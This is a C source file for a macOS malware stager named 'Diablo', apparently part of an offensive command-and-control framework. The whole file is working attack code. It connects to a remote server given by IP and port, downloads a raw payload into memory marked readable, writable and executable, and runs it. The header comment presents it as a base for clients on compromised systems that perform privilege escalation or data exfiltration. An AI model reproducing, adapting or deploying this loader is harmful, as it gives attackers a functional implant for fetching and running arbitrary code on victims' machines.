/* 
This script is a basic implementation of a C2 (Command-and-Control) connecting to a AM0N-Eye client that connects to a remote server specified by the IP address and port number provided as command-line arguments. Once connected, the client receives a payload of executable code from the server and executes it.

The payload is received into a memory-mapped buffer that has read, write, and execute permissions. This buffer is allocated using the mmap system call. Once the payload is received, the socket is closed, and the buffer is executed as a function using a function pointer cast.

This script can be used as a starting point to build more complex C2 clients that can perform various tasks on a compromised system, such as privilege escalation or data exfiltration.

 -------------------------------
| Author : S3N4T0R               |
| Name : Diablo                  |
| Date : july-2021               |
| OS   : Mac-os                  |
 --------------------------------
Build: gcc Diablo.c -o Diablo
Use : ./command_control ip_address port
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAYLOAD_MAX_SIZE 4096

void recv_frame(int sockfd, char *buffer, size_t size) {
    size_t total_bytes = 0;
    ssize_t bytes_read = 0;

    while (total_bytes < size) {
        bytes_read = recv(sockfd, buffer + total_bytes, size - total_bytes, 0);

        if (bytes_read <= 0) {
            perror("recv");
            exit(EXIT_FAILURE);
        }

        total_bytes += bytes_read;
    }
}

void go(char * host, uint16_t port) {
    struct sockaddr_in serv_addr;
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
        perror("inet_pton");
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    char * payload = mmap(NULL, PAYLOAD_MAX_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (payload == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    recv_frame(sockfd, payload, PAYLOAD_MAX_SIZE);
    close(sockfd);
    ((void(*)(void))payload)();
}

int main(int argc, char * argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    go(argv[1], atoi(argv[2]));
    return 0;
}
